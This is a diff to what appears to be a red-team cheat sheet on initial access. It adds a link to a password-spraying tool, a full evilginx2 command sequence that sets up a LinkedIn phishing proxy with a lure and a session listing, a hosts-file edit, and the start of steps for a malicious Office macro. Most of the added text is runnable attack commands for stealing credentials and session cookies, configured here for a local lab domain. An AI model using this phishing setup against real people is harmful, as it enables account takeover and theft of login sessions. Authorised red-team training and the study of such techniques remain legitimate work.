@@ -1,6 +1,29 @@
 ## Initial Access
 
-### Office Macro
+### External Password Spraying
+
+Kindly refer to this repo: https://github.com/hassan0x/MailHunter
+
+### MITM Attack
+```
+git clone https://github.com/kgretzky/evilginx2
+cd evilginx2 && go run main.go -p phishlets/ -developer
+config domain phishing.local
+config ip 127.0.0.1
+phishlets hostname linkedin phishing.local
+phishlets get-hosts linkedin
+phishlets enable linkedin
+lures create linkedin
+lures edit 0 redirect_url https://www.linkedin.com
+lures get-url 0
+sessions
+```
+Add the local domain to the hosts file on linux. 
+```
+echo "127.0.0.1 phishing.local www.phishing.local" >> /etc/hosts
+```
+
+### Malicious Office Macro
 
 - Open microsoft word or excel.
 - Go to view -> macros -> view macros.
